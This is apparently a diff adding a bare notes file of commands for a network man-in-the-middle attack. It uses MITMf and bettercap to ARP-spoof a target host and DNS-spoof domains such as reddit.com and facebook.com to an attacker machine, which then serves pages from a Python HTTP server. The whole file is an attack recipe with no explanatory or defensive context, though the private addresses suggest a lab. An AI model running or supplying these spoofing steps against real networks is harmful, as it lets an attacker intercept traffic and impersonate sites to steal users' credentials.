@@ -1,0 +1,22 @@
+git clone https://github.com/byt3bl33d3r/MITMf
+sudo nano -l MITMf/config/mitmf.conf 
+      *.reddit.com=192.168.56.132 --> line no: 42 -> add the kali ip 
+
+sudo python mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --target 192.168.1.50
+
+
+============================================================
+
+        sudo bettercap -iface eth0
+              net.probe on
+              set arp.spoof.targets 192.168.56.134
+              arp.spoof on
+              set dns.spoof.domains facebook.com
+              set dns.spoof.address 192.168.56.132
+              dns.spoof on
+        
+        nslookup test.com
+
+
+        sudo python3 -m http.server 80
+
